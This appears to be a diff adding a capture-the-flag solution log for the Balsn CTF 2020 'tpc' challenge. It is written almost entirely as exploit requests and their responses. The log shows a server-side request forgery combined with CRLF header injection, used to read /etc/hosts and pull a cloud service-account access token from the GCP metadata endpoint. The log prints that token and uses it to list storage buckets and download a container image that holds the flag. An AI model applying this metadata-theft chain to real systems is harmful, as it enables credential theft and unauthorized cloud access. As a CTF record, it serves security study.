@@ -1,0 +1,89 @@
+Python-urllib/3.7
+
+http://35.194.175.80:8000/query?site=file:///etc/hosts
+	169.254.169.254 metadata.google.internal metadata
+
+
+
+# Get api access token with CRLF vuln
+
+http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0aX:
+	{"access_token":"ya29.c.KpcB5Qc87b2C-qkx9XzzXty3g8-T7T9TEYNphwQnekVizYkhLcaFc-r3r-3PzFnYgI1M5jIsP4QHPJKMsSmsLP2YdKDAaatT-pZqW3rrnz5_-hXVccMK2s87sFlGgpWmgCMp2XFykUrWV2-0sF-JswvgWJ3OlKaKjTf5s5faHOVfDJQVTaHS2WuPBAmNDszpfpbMnkUw0MIcIQ","expires_in":3545,"token_type":"Bearer"}
+
+
+
+# Check authority of api access token
+
+http://35.194.175.80:8000/query?site=https://www.googleapis.com/oauth2/v1/tokeninfo%3faccess_token=ya29.c.KpcB5Qc87b2C-qkx9XzzXty3g8-T7T9TEYNphwQnekVizYkhLcaFc-r3r-3PzFnYgI1M5jIsP4QHPJKMsSmsLP2YdKDAaatT-pZqW3rrnz5_-hXVccMK2s87sFlGgpWmgCMp2XFykUrWV2-0sF-JswvgWJ3OlKaKjTf5s5faHOVfDJQVTaHS2WuPBAmNDszpfpbMnkUw0MIcIQ%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0aAuthorization:%20Bearer%20ya29.c.KpcB5Qc87b2C-qkx9XzzXty3g8-T7T9TEYNphwQnekVizYkhLcaFc-r3r-3PzFnYgI1M5jIsP4QHPJKMsSmsLP2YdKDAaatT-pZqW3rrnz5_-hXVccMK2s87sFlGgpWmgCMp2XFykUrWV2-0sF-JswvgWJ3OlKaKjTf5s5faHOVfDJQVTaHS2WuPBAmNDszpfpbMnkUw0MIcIQ%0d%0aX:
+	{
+		"issued_to": "102193360015934362205",
+		"audience": "102193360015934362205",
+		"scope": "https://www.googleapis.com/auth/trace.append https://www.googleapis.com/auth/monitoring.write https://www.googleapis.com/auth/service.management.readonly https://www.googleapis.com/auth/servicecontrol https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_only",
+		"expires_in": 3226,
+		"access_type": "online"
+	}
+
+
+
+# Get project id
+
+http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/project/project-id%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0aX:
+	balsn-ctf-2020-tpc
+
+
+
+# Get buckets with access token
+
+http://35.194.175.80:8000/query?site=https://www.googleapis.com/storage/v1/b%3fproject=balsn-ctf-2020-tpc%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0aAuthorization:%20Bearer%20ya29.c.KpcB5Qc87b2C-qkx9XzzXty3g8-T7T9TEYNphwQnekVizYkhLcaFc-r3r-3PzFnYgI1M5jIsP4QHPJKMsSmsLP2YdKDAaatT-pZqW3rrnz5_-hXVccMK2s87sFlGgpWmgCMp2XFykUrWV2-0sF-JswvgWJ3OlKaKjTf5s5faHOVfDJQVTaHS2WuPBAmNDszpfpbMnkUw0MIcIQ%0d%0aX:
+{
+	"kind": "storage#buckets",
+	"items": [
+    {
+    	"kind": "storage#bucket",
+    	"selfLink": "https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com",
+		"id": "asia.artifacts.balsn-ctf-2020-tpc.appspot.com",
+		"name": "asia.artifacts.balsn-ctf-2020-tpc.appspot.com",
+		"projectNumber": "909684563558",
+		"metageneration": "1",
+		"location": "ASIA",
+		"storageClass": "STANDARD",
+		"etag": "CAE=",
+		"timeCreated": "2020-10-03T05:12:42.035Z",
+		"updated": "2020-10-03T05:12:42.035Z",
+		"iamConfiguration": {
+        	"bucketPolicyOnly": {
+          		"enabled": false
+        	},
+        	"uniformBucketLevelAccess": {
+          		"enabled": false
+        	}
+    	},
+    	"locationType": "multi-region"
+    }
+  	]
+}
+
+
+
+# Get bucket's object
+
+http://35.194.175.80:8000/query?site=https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0aAuthorization:%20Bearer%20ya29.c.KpcB5Qc87b2C-qkx9XzzXty3g8-T7T9TEYNphwQnekVizYkhLcaFc-r3r-3PzFnYgI1M5jIsP4QHPJKMsSmsLP2YdKDAaatT-pZqW3rrnz5_-hXVccMK2s87sFlGgpWmgCMp2XFykUrWV2-0sF-JswvgWJ3OlKaKjTf5s5faHOVfDJQVTaHS2WuPBAmNDszpfpbMnkUw0MIcIQ%0d%0aX:
+	See objects.txt
+
+
+
+# Get image
+
+curl 'https://www.googleapis.com/download/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:82b1f60a85530dec16e7db3c4af65f3ea612f579dc25b0daa35d5d253183a537?generation=1605158574577657&alt=media' -H 'Authorization: Bearer ya29.c.KpcB5Qc87b2C-qkx9XzzXty3g8-T7T9TEYNphwQnekVizYkhLcaFc-r3r-3PzFnYgI1M5jIsP4QHPJKMsSmsLP2YdKDAaatT-pZqW3rrnz5_-hXVccMK2s87sFlGgpWmgCMp2XFykUrWV2-0sF-JswvgWJ3OlKaKjTf5s5faHOVfDJQVTaHS2WuPBAmNDszpfpbMnkUw0MIcIQ' > image.gz
+
+
+
+# Decompress
+
+gzip -d image.gz
+mv image image.tar
+tar xvf image.tar
+
+
+./opt/workdir/flag-6ba72dc9ffb518f5bcd92eee.txt
+	BALSN{What_permissions_does_the_service_account_need}
